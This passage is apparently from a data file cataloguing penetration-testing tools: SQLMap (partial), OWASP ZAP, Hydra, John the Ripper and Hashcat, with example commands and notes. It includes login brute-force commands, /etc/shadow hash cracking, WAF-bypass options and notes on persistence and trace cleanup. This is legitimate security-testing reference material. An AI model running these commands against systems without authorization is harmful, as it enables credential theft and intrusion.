DNS exfiltration, HTTP requests\\n• Takeover: Full database and OS takeover capabilities\\n\\nRisk and Level Parameters:\\n• --level (1-5): Test depth. Higher = more payloads, slower\\n  • Level 1: GET parameters only\\n  • Level 2: POST parameters, cookies\\n  • Level 3: HTTP User-Agent, Referer\\n  • Level 4: HTTP headers\\n  • Level 5: All possible injection points\\n• --risk (1-3): Payload aggressiveness\\n  • Risk 1: Safe payloads (default)\\n  • Risk 2: Heavy query time-based payloads\\n  • Risk 3: OR-based injection (may corrupt data)\\n\\nWAF Bypass Techniques:\\n• Tamper Scripts: 50+ bypass scripts for various WAFs\\n  • space2comment: Replace space with comment\\n  • between: Replace greater than with NOT BETWEEN\\n  • equaltolike: Replace equals with LIKE\\n  • charencode: URL encode characters\\n  • base64encode: Base64 encode entire payload\\n  • versionedkeywords: Use version-specific comments\\n• Randomization: --randomize parameter values\\n• User-Agent: --random-agent for different UA strings\\n• Delay: --delay between requests\\n• Chunked Encoding: --chunked HTTP transfer encoding\\n\\nDatabase-Specific Exploitation:\\n• MySQL: LOAD_FILE(), INTO OUTFILE, User-Defined Functions\\n• PostgreSQL: COPY TO/FROM, large objects\\n• MSSQL: xp_cmdshell, OLE automation, CLR assemblies\\n• Oracle: UTL_FILE, DBMS packages, Java stored procedures\\n\\nPost-Exploitation:\\n• Privilege Escalation: Identify and exploit weak configurations\\n• Lateral Movement: Enumerate network, linked servers\\n• Persistence: Create database users, backdoors\\n• Data Exfiltration: Scheduled dumps, automated extraction\\n• Cleanup: Remove traces, restore original state\\n\\nBest Practices:\\n• Start with level 1, risk 1 to avoid data corruption\\n• Use --batch for automated scanning\\n• Always test on authorized targets only\\n• Use --threads for faster enumeration (2-10 threads)\\n• Save session data with --session for resuming\\n• Use --flush-session to force fresh detection\\n• Log everything with --output-dir\\n• Test manually first with simple payloads\\n• Verify findings with multiple techniques\\n\\nCommon Pitfalls:\\n• False Positives: Verify with --string or --not-string\\n• WAF Blocking: Use tamper scripts and delay\\n• Time-Based Delays: Slow networks cause false positives\\n• Complex Parameters: May need --skip-static\\n• Cookie-Based Injection: Remember to mark with asterisk\\n• POST with CSRF: May need --csrf-token\\n\\nIntegration:\\n• Burp Suite: Use --proxy to route through Burp\\n• API Mode: Python API for custom scripts\\n• CI/CD: Automate security testing\\n• Bug Bounty: Automated initial assessment\\n\\nReal-World Scenarios:\\n• Authentication Bypass: Test login forms, password resets\\n• Admin Panel Discovery: Enumerate tables for admin_users\\n• Data Breach Simulation: Extract customer data for impact assessment\\n• Compliance Testing: Verify SQL injection protections (PCI DSS)\\n• Security Research: Discover zero-days in popular CMSs",
        githubUrl: "https://github.com/sqlmapproject/sqlmap",
        tags: ["sql injection", "exploitation", "database", "automation"],
        additionalInfo: "SQLMap supports a wide range of database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, and many others. It can work with different injection techniques and bypass various protection mechanisms."
      },
      {
        id: "owasp-zap",
        name: "OWASP ZAP",
        description: "Open Web Application Security Project Zed Attack Proxy is a free security tool for finding vulnerabilities in web applications",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "sudo apt install zaproxy",
        usage: "OWASP ZAP is used as both an automated scanner and manual testing tool for web application security assessments",
        examples: [
          {
            title: "Start ZAP GUI",
            code: "zaproxy"
          },
          {
            title: "Start ZAP headless (daemon mode)",
            code: "zap.sh -daemon -port 8080 -config api.disablekey=true"
          },
          {
            title: "Quick baseline scan",
            code: "zap-baseline.py -t http://example.com"
          },
          {
            title: "Full scan with report",
            code: "zap-full-scan.py -t http://example.com -r report.html"
          },
          {
            title: "API scan",
            code: "zap-api-scan.py -t http://example.com/api/openapi.json -f openapi"
          },
          {
            title: "Spider a website",
            code: "zap-cli spider http://example.com"
          },
          {
            title: "Active scan",
            code: "zap-cli active-scan http://example.com"
          },
          {
            title: "Quick scan from command line",
            code: "zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://example.com"
          },
          {
            title: "Generate HTML report",
            code: "zap-cli report -o report.html -f html"
          },
          {
            title: "Scan with authentication",
            code: "zap-cli --zap-url http://localhost:8080 open-url http://example.com/login"
          },
          {
            title: "Export alerts to JSON",
            code: "zap-cli alerts -f json -o alerts.json"
          },
          {
            title: "Docker automated scan",
            code: "docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com"
          }
        ],
        documentation: "OWASP ZAP (Zed Attack Proxy) is the world's most popular free web application security scanner. Maintained by hundreds of volunteers under OWASP, it's designed for both beginners and professional penetration testers. With automated scanners and manual testing tools, ZAP helps find security vulnerabilities in web applications during development and testing.\\n\\nCore Components:\\n• Proxy: Intercept and modify HTTP/HTTPS traffic\\n• Spider: Automatically discover application content and functionality\\n• Scanner: Automated vulnerability detection (active and passive)\\n• Fuzzer: Send malicious payloads to test application resilience\\n• Authentication: Session management and authentication testing\\n• API: Extensive REST API for automation\\n• Add-ons: Extensible marketplace with 100+ plugins\\n\\nScanning Modes:\\n• Passive Scanning: Analyze responses without sending attacks\\n  • No risk to target application\\n  • Detects: Missing headers, information disclosure, cookies\\n  • Always running in background\\n• Active Scanning: Send attack payloads\\n  • Tests for: SQLi, XSS, XXE, SSRF, command injection\\n  • Configurable attack strength\\n  • Can impact application performance\\n• Traditional Spider: HTML-based crawling\\n• Ajax Spider: JavaScript-aware crawling\\n\\nAutomated Scan Scripts:\\n• Baseline Scan: Quick vulnerability check (10-15 mins)\\n  • Passive scanning only\\n  • Spider + passive rules\\n  • CI/CD integration ready\\n• Full Scan: Comprehensive testing (hours)\\n  • Spider + active + passive\\n  • All attack categories\\n  • Detailed reports\\n• API Scan: OpenAPI/SOAP testing\\n  • Import API definitions\\n  • Automatic endpoint testing\\n  • REST/GraphQL support\\n\\nAuthentication Support:\\n• Form-Based: Auto-detect login forms\\n• Script-Based: Custom authentication scripts\\n• HTTP/NTLM: Basic and NTLM auth\\n• OAuth: OAuth 2.0 support\\n• Session Management: Maintain authenticated state\\n• Anti-CSRF Tokens: Automatic token handling\\n\\nVulnerability Detection:\\n• Injection Flaws:\\n  • SQL Injection (Error, Boolean, Time-based)\\n  • XSS (Reflected, Stored, DOM)\\n  • Command Injection\\n  • LDAP/XPath Injection\\n  • XXE (XML External Entity)\\n• Broken Authentication:\\n  • Weak passwords\\n  • Session fixation\\n  • Insecure session management\\n• Sensitive Data Exposure:\\n  • Unencrypted transmission\\n  • Weak encryption\\n  • Information disclosure\\n• Security Misconfiguration:\\n  • Missing security headers\\n  • Default credentials\\n  • Directory listing\\n  • Unnecessary HTTP methods\\n• Access Control:\\n  • Path traversal\\n  • Privilege escalation\\n  • IDOR (Insecure Direct Object Reference)\\n\\nZAP API:\\n• REST API: Full control via HTTP\\n• Languages: Python, Java, Node.js, PHP clients\\n• Operations: Scan, spider, alerts, authentication\\n• Automation: CI/CD pipeline integration\\n• Port: Default 8080\\n• API Key: Security for remote access\\n\\nDocker Integration:\\n• Official Images: owasp/zap2docker-stable, weekly\\n• Automated Scanning: No GUI required\\n• CI/CD: Jenkins, GitLab CI, GitHub Actions\\n• Scan Types: Baseline, full, API scans\\n• Volume Mounting: Save reports externally\\n\\nAdd-ons and Extensions:\\n• Active Scan Rules: Additional vulnerability checks\\n• Passive Scan Rules: More security checks\\n• Technology Detection: Wappalyzer integration\\n• Report Generation: Multiple formats\\n• Authentication: Advanced auth helpers\\n• Fuzzing: Custom fuzzing dictionaries\\n• API: GraphQL, WebSocket support\\n• Import/Export: Burp, Postman, OpenAPI\\n\\nReporting:\\n• Formats: HTML, XML, JSON, Markdown\\n• Risk Levels: High, Medium, Low, Informational\\n• Confidence: High, Medium, Low, Falsepositive\\n• Details: Description, solution, references\\n• Customization: Template customization\\n• Export: Multiple vulnerabilities grouped\\n\\nContext Management:\\n• Define Scope: Include/exclude URLs\\n• Technology: Set technology stack\\n• Authentication: Per-context auth config\\n• Session Management: Context-specific sessions\\n• Users: Multiple user testing\\n• Access Control: Permission testing\\n\\nFuzzing Capabilities:\\n• Fuzzer Tool: Manual fuzzing interface\\n• Payloads: Built-in fuzz files\\n• Custom: Add your own payloads\\n• Processors: Encode, hash, script\\n• Analysis: Detect anomalies in responses\\n• Categories: XSS, SQLi, Command injection\\n\\nCI/CD Integration:\\n• Jenkins: ZAP Plugin available\\n• GitLab CI: Docker-based scanning\\n• GitHub Actions: Automated PR scanning\\n• Azure DevOps: Pipeline integration\\n• Bamboo: Build integration\\n• Break Build: Fail on high-risk findings\\n\\nBest Practices:\\n• Start with baseline scans in dev\\n• Use contexts to define scope\\n• Configure authentication properly\\n• Review false positives\\n• Tune scanner for application type\\n• Use both traditional and Ajax spiders\\n• Monitor scan progress and logs\\n• Save session files regularly\\n• Update add-ons frequently\\n• Test in non-production first\\n\\nPerformance Tuning:\\n• Thread Count: Adjust for target capacity\\n• Delays: Add delays to avoid overload\\n• Policy: Choose appropriate scan policy\\n• Exclusions: Exclude logout, destructive operations\\n• Memory: Increase Java heap size\\n• Ajax Spider: Limit max duration\\n\\nCommon Use Cases:\\n• SDLC Integration: Security in development\\n• Penetration Testing: Manual and automated testing\\n• Compliance: OWASP Top 10, PCI DSS validation\\n• Security Regression: Automated security tests\\n• API Security: RESTful API testing\\n• Training: Learn web security concepts\\n• Bug Bounty: Quick vulnerability discovery\\n\\nIntegration:\\n• Burp Suite: Import/export site trees\\n• Selenium: Browser automation testing\\n• Postman: Import API collections\\n• Nmap: Combine with port scanning\\n• Metasploit: Vulnerability to exploitation\\n• SIEM: Export findings for correlation\\n\\nLimitations:\\n• False Positives: Requires manual verification\\n• JavaScript: Limited compared to manual testing\\n• Business Logic: Cannot detect logic flaws\\n• Modern Frameworks: React/Vue detection challenges\\n• Performance: Can slow down applications\\n• Complex Auth: May need custom scripts\\n\\nReal-World Applications:\\n• DevSecOps: Shift-left security testing\\n• Continuous Security: Automated pipeline checks\\n• Compliance Audits: Validate security controls\\n• Pre-Production: Catch issues before deployment\\n• Regression Testing: Ensure fixes don't break security\\n• Security Training: Hands-on learning tool\\n• Bug Bounty: Initial reconnaissance and testing\\n• Client Demos: Show vulnerabilities to stakeholders",
        githubUrl: "https://github.com/zaproxy/zaproxy",
        tags: ["web", "proxy", "scanner", "OWASP", "penetration testing"]
      }
    ]
  },
  {
    id: "password-attacks",
    name: "Password Attacks",
    description: "Tools for attacking password-based authentication systems to identify weak credentials",
    tools: [
      {
        id: "hydra",
        name: "Hydra",
        description: "Fast and flexible online password cracking tool",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install hydra",
        usage: "Hydra is used to brute force credentials for various network services. It supports numerous protocols including FTP, HTTP, HTTPS, SMB, SSH, and many more.",
        examples: [
          {
            title: "SSH brute force",
            code: "hydra -l user -P passwordlist.txt ssh://192.168.1.1"
          },
          {
            title: "HTTP form brute force",
            code: "hydra -l admin -P passwordlist.txt 192.168.1.1 http-post-form \"/login:username=^USER^&password=^PASS^:F=Login failed\""
          },
          {
            title: "FTP brute force with verbose output",
            code: "hydra -l user -P passwordlist.txt ftp://192.168.1.1 -v"
          },
          {
            title: "Multiple services scan",
            code: "hydra -L users.txt -P passwords.txt 192.168.1.1 ssh ftp mysql"
          }
        ],
        documentation: "THC-Hydra is the world's most popular network login cracker, supporting over 50 protocols. Created by van Hauser and part of The Hacker's Choice toolkit, it's extremely fast due to parallel connection support and modular architecture. Used by penetration testers and security auditors worldwide to test authentication security.\n\nSupported Protocols (50+):\n• Remote Access: SSH, Telnet, RDP, VNC, X11\n• File Transfer: FTP, FTPS, TFTP, SMB, NFS\n• Databases: MySQL, PostgreSQL, MSSQL, Oracle, MongoDB, Redis\n• Web: HTTP/HTTPS (GET/POST), HTTP-Proxy, HTTPS-form\n• Email: SMTP, POP3, IMAP, SMTP-Enum\n• Network Services: SNMP, LDAP, Cisco auth, Cisco enable\n• Proxies: SOCKS5, HTTP-Proxy\n• Other: SIP, IRC, ICQ, XMPP, NNTP, Subversion, Asterisk\n\nCore Features:\n• Parallel Attacks: Multiple connections simultaneously\n• Flexible Input: Username/password lists or single credentials\n• Resume Support: Continue interrupted attacks\n• Proxy Support: Route through HTTP/SOCKS proxies\n• SSL/TLS: Support for encrypted protocols\n• Exit Conditions: Stop on first success or continue\n• Verbosity Levels: Control output detail\n• Multi-Target: Attack multiple hosts\n• Loop Mode: Continuous testing\n\nAttack Modes:\n• Username List + Password List: -L users.txt -P passwords.txt\n• Single Username + Password List: -l admin -P passwords.txt\n• Username List + Single Password: -L users.txt -p Password123\n• Single Credentials: -l admin -p password\n• Colon-Separated File: -C credentials.txt (format: user:pass)\n• Empty Password: -e n (test null passwords)\n• Reverse Login: -e s (try login as password)\n• Same as Login: -e r (username = password)\n\nPerformance Tuning:\n• -t N: Number of parallel tasks (default 16)\n  • SSH: Limit to 4 (connection limits)\n  • HTTP: Use 16-64 (faster protocols)\n  • Adjust based on target capacity\n• -w N: Timeout in seconds (default 30)\n• -c N: Time between connection attempts\n• -W N: Wait time for responses\n• Memory: Loads files into RAM for speed\n\nHTTP/HTTPS Form Attacks:\n• http-get-form: GET method forms\n• http-post-form: POST method forms (most common)\n• Format: \"path:parameters:failure_string\"\n• Parameters:\n  • ^USER^: Username placeholder\n  • ^PASS^: Password placeholder\n  • F=text: Failure indicator\n  • S=text: Success indicator\n  • C=/page: Cookie requirement\n• Example: \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"\n• Cookie Support: -C \"PHPSESSID=abc123\"\n\nSuccess Detection:\n• F= Failure String: Stop when string NOT found\n• S= Success String: Stop when string IS found\n• H= Header Check: Look in HTTP headers\n• Conditional: F=invalid:S=welcome\n• Case Sensitivity: Exact match required\n\nVerbosity Options:\n• -v/-V: Verbose output (show attempts)\n• -d: Debug mode (detailed protocol info)\n• -q: Quiet mode (minimal output)\n• -o FILE: Save output to file\n• -b FORMAT: Output format (text, json, jsonv1)\n\nSession Management:\n• -R: Restore previous session\n• Auto-save: Every 5 minutes\n• .restore file: Contains session state\n• Safe interruption: Ctrl+C to save and exit\n• Multiple sessions: Use different output files\n\nProxy Configuration:\n• HTTP Proxy: -P http://proxy:8080\n• SOCKS5: -P socks5://proxy:1080\n• Authentication: -P http://user:pass@proxy:8080\n• Route through Burp: -P http://127.0.0.1:8080\n\nSSL/TLS Support:\n• Automatic SSL detection\n• Protocol-specific: ftps://, https://, smtps://\n• Certificate validation: Disabled by default\n• SNI support: Server Name Indication\n\nAdvanced Options:\n• -f: Exit after first found user/pass pair\n• -F: Exit after first found for any user\n• -M FILE: Attack multiple targets from file\n• -u: Loop users not passwords (reverse order)\n• -x: Brute force generation (min:max:charset)\n• -y: Disable protocol-specific optimizations\n• -I: Ignore existing restore file\n\nCredential File Formats:\n• Username List (-L): One username per line\n• Password List (-P): One password per line\n• Colon Format (-C): username:password per line\n• Comments: # at start of line\n• Whitespace: Trimmed automatically\n\nCommon Protocols:\n• SSH: ssh://192.168.1.1:22\n• FTP: ftp://192.168.1.1:21\n• HTTP POST: http-post-form\n• RDP: rdp://192.168.1.1:3389\n• MySQL: mysql://192.168.1.1:3306\n• SMB: smb://192.168.1.1:445\n\nBest Practices:\n• Always get authorization before testing\n• Start with small password lists\n• Use -t 4 for SSH (avoid lockouts)\n• Monitor for account lockouts\n• Use -f to stop on first success (stealth)\n• Test in lab environment first\n• Document all attempts for reporting\n• Combine with OSINT for targeted lists\n• Use company password policies for wordlist generation\n• Respect rate limits and lockout policies\n\nCommon Pitfalls:\n• Account Lockouts: Too many parallel tasks\n• IP Blocking: No delay between attempts\n• SSL Issues: Certificate validation errors\n• Form Detection: Wrong failure string\n• Connection Limits: SSH max sessions\n• Resource Exhaustion: Target overload\n• False Positives: Incorrect success detection\n• Session Cookies: Not maintaining state\n\nWordlist Strategies:\n• Common Passwords: rockyou.txt, SecLists\n• Company-Specific: OSINT-derived terms\n• Policy-Based: Follow known password policies\n• Seasonal: Current year, season, month\n• Username Variations: Names, roles, departments\n• Default Credentials: Vendor defaults\n• Leaked Passwords: Breach databases (legal use only)\n\nIntegration:\n• Nmap: Enumerate services, then attack\n• Metasploit: auxiliary/scanner/http/http_login\n• Burp Suite: Intercept and craft form attacks\n• Medusa: Alternative tool (similar features)\n• Patator: Python-based alternative\n• Crackmapexec: SMB/WinRM specialized\n• Ncrack: Nmap's login cracker\n\nDefensive Measures (Know Your Enemy):\n• Account Lockout: 5 attempts, 30-minute lockout\n• Rate Limiting: Delay between attempts\n• CAPTCHA: Prevent automated attacks\n• Multi-Factor Authentication: Add second factor\n• Geo-Blocking: Block suspicious locations\n• Honeypots: Detect and track attackers\n• Strong Passwords: Enforce complexity\n• Monitor Logs: Alert on brute force patterns\n\nReal-World Applications:\n• Penetration Testing: Test authentication security\n• Security Audits: Validate password policies\n• Red Team: Gain initial access\n• Compliance: Demonstrate weak credentials\n• Incident Response: Test compromised accounts\n• Bug Bounty: Identify weak authentication\n• Password Auditing: Test organizational passwords\n• Recovery: Legitimate password recovery (authorized)\n\nLegal and Ethical Considerations:\n• Authorization Required: Written permission only\n• Scope Definition: Stay within authorized targets\n• Data Handling: Secure credential storage\n• Compliance: Follow local laws (CFAA, etc.)\n• Responsible Disclosure: Report findings properly\n• Impact Assessment: Avoid service disruption\n• Documentation: Log all activities\n\nAlternatives:\n• Medusa: Similar tool, different architecture\n• Ncrack: Nmap project, network authentication\n• Patator: Python-based, highly modular\n• Crowbar: RDP and VNC focused\n• Crackmapexec: Windows-specific, very powerful\n• Brutespray: Nmap to Hydra automation",
        githubUrl: "https://github.com/vanhauser-thc/thc-hydra",
        tags: ["brute force", "password", "authentication", "cracking", "login"],
        additionalInfo: "THC-Hydra is maintained by van Hauser and was developed as part of THC (The Hackers Choice) group's tools. It's considered one of the fastest network login crackers with support for more than 50 protocols and services."
      },
      {
        id: "john",
        name: "John the Ripper",
        description: "Password security auditing and password recovery tool",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install john",
        usage: "John the Ripper is used to crack password hashes and perform password auditing. It combines several cracking modes and is highly customizable with external cracking rules.",
        examples: [
          {
            title: "Basic password cracking",
            code: "john hashes.txt"
          },
          {
            title: "Crack MD5 hashes",
            code: "john --format=raw-md5 hashes.txt"
          },
          {
            title: "Show cracked passwords",
            code: "john --show hashes.txt"
          },
          {
            title: "Wordlist attack with rules",
            code: "john --wordlist=rockyou.txt --rules hashes.txt"
          },
          {
            title: "Benchmark all hash types",
            code: "john --test --format=all"
          },
          {
            title: "Incremental mode (brute force)",
            code: "john --incremental=Alnum hashes.txt"
          },
          {
            title: "Crack Linux shadow file",
            code: "unshadow /etc/passwd /etc/shadow > mypasswd\\njohn mypasswd"
          },
          {
            title: "Crack Windows NTLM hashes",
            code: "john --format=NT hashes.txt"
          },
          {
            title: "Crack bcrypt hashes",
            code: "john --format=bcrypt hashes.txt"
          },
          {
            title: "Crack SHA-512 crypt hashes",
            code: "john --format=sha512crypt shadow.txt"
          },
          {
            title: "Use specific wordlist without rules",
            code: "john --wordlist=custom.txt --rules=None hashes.txt"
          },
          {
            title: "Single crack mode (user info based)",
            code: "john --single hashes.txt"
          },
          {
            title: "Mask attack (hybrid)",
            code: "john --mask='?l?l?l?l?d?d?d?d' hashes.txt"
          },
          {
            title: "Resume interrupted session",
            code: "john --restore"
          },
          {
            title: "Use multiple CPU cores",
            code: "john --fork=4 hashes.txt"
          },
          {
            title: "Crack PDF passwords",
            code: "pdf2john.pl document.pdf > pdf.hash\\njohn pdf.hash"
          },
          {
            title: "Crack ZIP file passwords",
            code: "zip2john archive.zip > zip.hash\\njohn zip.hash"
          },
          {
            title: "Crack SSH private key passphrases",
            code: "ssh2john.py id_rsa > ssh.hash\\njohn --wordlist=rockyou.txt ssh.hash"
          }
        ],
        documentation: "John the Ripper is a legendary password cracking tool, first released by Solar Designer in 1996. It combines multiple cracking modes and supports hundreds of hash and cipher types, making it one of the most versatile password auditing tools available. Available in both free (core) and community-enhanced (Jumbo) versions.\\n\\nSupported Hash Types (200+):\\n• Unix crypt: Traditional DES, MD5, Blowfish (bcrypt), SHA-256, SHA-512\\n• Windows: LM, NTLM, NTLMv1, NTLMv2, Kerberos\\n• Network protocols: MD5-Challenge, NETHALFLM, MSCHAPv2\\n• Web applications: phpBB3, Drupal7, Joomla, WordPress\\n• Databases: MySQL, PostgreSQL, Oracle, MSSQL\\n• File formats: PDF, ZIP, RAR, Office, KeePass, 1Password\\n• Modern hashes: bcrypt, scrypt, Argon2, PBKDF2\\n• Cryptocurrencies: Bitcoin, Ethereum wallet files\\n\\nCracking Modes:\\n• Single Crack Mode:\\n  • Uses username and GECOS information\\n  • Applies intelligent transformations (John, john, JOHN, j0hn)\\n  • Fast initial pass before other modes\\n  • Effective against lazy users\\n• Wordlist Mode:\\n  • Dictionary-based attack\\n  • Processes wordlist with rule transformations\\n  • Supports pipes for dynamic wordlist generation\\n  • Can combine multiple wordlists\\n• Incremental Mode (Brute Force):\\n  • True brute force, tries all combinations\\n  • Uses character frequency analysis\\n  • Configurable character sets (Alnum, Alpha, Digits, ASCII)\\n  • Continues where it left off on restart\\n  • Extremely slow but guaranteed to find password\\n• Mask Mode:\\n  • Hybrid attack with position-specific characters\\n  • ?l = lowercase, ?u = uppercase, ?d = digits, ?s = symbols\\n  • ?a = all printable ASCII\\n  • Example: Password123 = ?u?l?l?l?l?l?l?l?d?d?d\\n\\nWord Mangling Rules:\\n• Built-in rulesets: Single, Wordlist, NT, Jumbo\\n• Operations: Append, prepend, duplicate, reverse\\n• Case modifications: Capitalize, lowercase, toggle\\n• Character substitution: a→@, e→3, i→1, o→0\\n• Position-based transformations\\n• Reject rules for performance\\n• Custom rules in john.conf\\n• Rule stacking for complex transformations\\n\\nJumbo Version Enhancements:\\n• 200+ additional hash formats\\n• GPU acceleration support (OpenCL, CUDA)\\n• Better wordlist handling\\n• Enhanced mask mode\\n• Competitive format crackers\\n• Regular security updates\\n• Community contributions\\n\\nFormat Detection:\\n• Automatic format detection (limited)\\n• Use --format=NAME for explicit specification\\n• List formats: john --list=formats\\n• List subformats: john --list=subformats\\n• Benchmark specific format: john --test --format=md5\\n\\nHelper Scripts (*2john utilities):\\n• zip2john: Extract ZIP password hashes\\n• rar2john: Extract RAR archive hashes\\n• pdf2john: Extract PDF password hashes\\n• office2john: Microsoft Office documents\\n• keepass2john: KeePass database files\\n• ssh2john: SSH private key passphrases\\n• truecrypt2john: TrueCrypt volumes\\n• bitcoin2john: Bitcoin wallet files\\n• ethereum2john: Ethereum keystores\\n• mozilla2john: Firefox master password\\n\\nPerformance Optimization:\\n• --fork=N: Parallelize across CPU cores\\n• OpenMP: Automatic multi-threading for some formats\\n• GPU acceleration: --format=sha512crypt-opencl\\n• Node distribution: Distribute across multiple machines\\n• Format-specific optimizations\\n• Memory management for large wordlists\\n\\nSession Management:\\n• Automatic session saving every 10 minutes\\n• --session=NAME: Named sessions\\n• --restore[=NAME]: Resume interrupted session\\n• --status[=NAME]: Check session progress\\n• Session files in ~/.john or current directory\\n\\nConfiguration (john.conf):\\n• Incremental mode character sets\\n• Word mangling rules\\n• External mode filters (C code)\\n• Hash algorithm preferences\\n• Cracking order optimization\\n• Format-specific parameters\\n• Markov mode settings\\n\\nExternal Mode:\\n• Custom filters written in C\\n• Compile into John at runtime\\n• Full control over candidate generation\\n• Can implement custom algorithms\\n• Examples: keyboard patterns, date generation\\n\\nPractical Workflows:\\n• Linux Audit:\\n  1. unshadow /etc/passwd /etc/shadow > combined\\n  2. john --single combined\\n  3. john --wordlist=rockyou.txt --rules combined\\n  4. john --incremental combined\\n• Windows Audit:\\n  1. Extract hashes with pwdump, fgdump, or mimikatz\\n  2. john --format=NT ntlm.txt\\n  3. john --format=LM lm.txt (if available)\\n• Application Passwords:\\n  1. Extract with appropriate *2john tool\\n  2. john --wordlist=passwords.txt hash.txt\\n  3. john --incremental=Alnum hash.txt\\n\\nBest Practices:\\n• Start with --single for quick wins\\n• Use rockyou.txt or similar common wordlists\\n• Apply rules for wordlist mutations\\n• Save output with --pot=custom.pot\\n• Use --show to view already cracked passwords\\n• Monitor progress with --status\\n• Run benchmark before production use\\n• Use --fork for multi-core CPUs\\n• Consider GPU version for massive jobs\\n• Keep john.pot backed up\\n\\nCommon Pitfalls:\\n• Wrong format specification (common with raw hashes)\\n• Not using rules with wordlists (misses obvious mutations)\\n• Running incremental mode first (extremely slow)\\n• Forgetting to check john.pot before restarting\\n• Not monitoring progress (--status)\\n• Using default john.conf (may need tuning)\\n• Expecting quick results with strong passwords\\n• Not utilizing multiple cores (--fork)\\n\\nIntegration:\\n• Hashcat: Complementary tool with GPU focus\\n• Hydra: Network service brute forcing\\n• Metasploit: Post-exploitation hash cracking\\n• Cain & Abel: Windows-focused alternative\\n• Ophcrack: Rainbow table attacks\\n• Custom scripts: Parse output for reporting\\n\\nReal-World Applications:\\n• Security Audits: Test organizational password strength\\n• Incident Response: Recover passwords from seized systems\\n• Forensics: Access encrypted evidence\\n• Compliance: Validate password policies (PCI DSS, NIST)\\n• Penetration Testing: Escalate privileges via weak passwords\\n• Red Team: Crack dumped hashes for lateral movement\\n• CTF: Recover passwords from challenge files\\n\\nLegal and Ethical Considerations:\\n• Only crack passwords you own or have authorization\\n• Document authorization before engagement\\n• Securely handle and dispose of password hashes\\n• Follow responsible disclosure for findings\\n• Comply with local laws regarding security testing",
        githubUrl: "https://github.com/openwall/john",
        tags: ["password cracking", "hash", "audit", "security testing"],
        additionalInfo: "John the Ripper was initially developed by Solar Designer and is now maintained by the Openwall Project. There are multiple versions available, including the core version and the community-enhanced 'jumbo' version with additional features."
      },
      {
        id: "hashcat",
        name: "Hashcat",
        description: "Advanced GPU-accelerated password recovery utility",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install hashcat",
        usage: "Hashcat is used for high-speed password cracking with GPU acceleration",
        examples: [
          {
            title: "Basic MD5 cracking with wordlist",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt"
          },
          {
            title: "Brute force attack (6 chars, all characters)",
            code: "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a"
          },
          {
            title: "Rule-based attack with best64 rules",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule"
          },
          {
            title: "Crack Windows NTLM hashes",
            code: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt"
          },
          {
            title: "Crack bcrypt hashes",
            code: "hashcat -m 3200 -a 0 bcrypt.txt wordlist.txt"
          },
          {
            title: "Crack WPA/WPA2 handshakes",
            code: "hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt"
          },
          {
            title: "Mask attack with known pattern (Password + 3 digits)",
            code: "hashcat -m 0 -a 3 hashes.txt Password?d?d?d"
          },
          {
            title: "Hybrid wordlist + mask attack",
            code: "hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d"
          },
          {
            title: "Combination attack (two wordlists)",
            code: "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt"
          },
          {
            title: "Use multiple GPUs",
            code: "hashcat -m 0 -a 0 -d 1,2,3 hashes.txt wordlist.txt"
          },
          {
            title: "Show cracked passwords",
            code: "hashcat -m 0 hashes.txt --show"
          },
          {
            title: "Benchmark all hash types",
            code: "hashcat -b"
          },
          {
            title: "Session management (resume)",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=mysession\\nhashcat --session=mysession --restore"
          },
          {
            title: "Increment mode (try 1-8 character passwords)",
            code: "hashcat -m 0 -a 3 hashes.txt --increment --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a"
          },
          {
            title: "Custom charset definition",
            code: "hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1"
          },
          {
            title: "Potfile output (save cracked hashes)",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt --potfile-path=custom.pot"
          },
          {
            title: "Crack with multiple rules",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule -r rules/toggles1.rule"
          },
          {
            title: "Hash cracking with status updates",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt --status --status-timer=10"
          }
        ],
        documentation: "Hashcat is the world's fastest password recovery tool, holding multiple world records for speed. Created by Jens 'atom' Steube, it's the first and only password cracker to support GPU acceleration with native OpenCL and CUDA support. It supports over 350 hash algorithms and five attack modes.\\n\\nSupported Hash Algorithms (350+):\\n• Raw Hashes: MD4, MD5, SHA1, SHA2-224/256/384/512, SHA3, BLAKE2\\n• Salted Hashes: MD5(salt.pass), sha1(salt.pass), custom salt positions\\n• Iterated Hashes: PBKDF2-HMAC-SHA1/SHA256/SHA512, bcrypt, scrypt\\n• Operating Systems: Unix crypt, macOS, Windows LM/NTLM/NTLMv2\\n• Network Protocols: NetNTLMv1/v2, Kerberos 5 TGS-REP, IKE-PSK, WPA/WPA2\\n• Applications: 7-Zip, RAR3/RAR5, ZIP, Office, PDF, Bitcoin, Ethereum\\n• Database Systems: MySQL, PostgreSQL, Oracle, MSSQL, MongoDB\\n• Web Applications: WordPress, Joomla, Drupal, phpBB3, Django\\n• VPN/Network: Cisco IOS, Juniper, IPsec, IKEv2, PPTP\\n\\nAttack Modes:\\n• Straight (-a 0): Dictionary attack with optional rules\\n  • Simple wordlist processing\\n  • Combine with rules for mutations\\n  • Most common and efficient mode\\n  • Example: hashcat -m 0 -a 0 hash.txt rockyou.txt\\n• Combination (-a 1): Combine words from two wordlists\\n  • Joins word1 + word2\\n  • Effective for compound passwords\\n  • Example: password + 123 = password123\\n  • Can generate massive candidates\\n• Brute-force (-a 3): Try all combinations (mask attack)\\n  • Position-specific character sets\\n  • Masks: ?l (lower), ?u (upper), ?d (digit), ?s (special), ?a (all)\\n  • Example: Password?d?d?d?d\\n  • 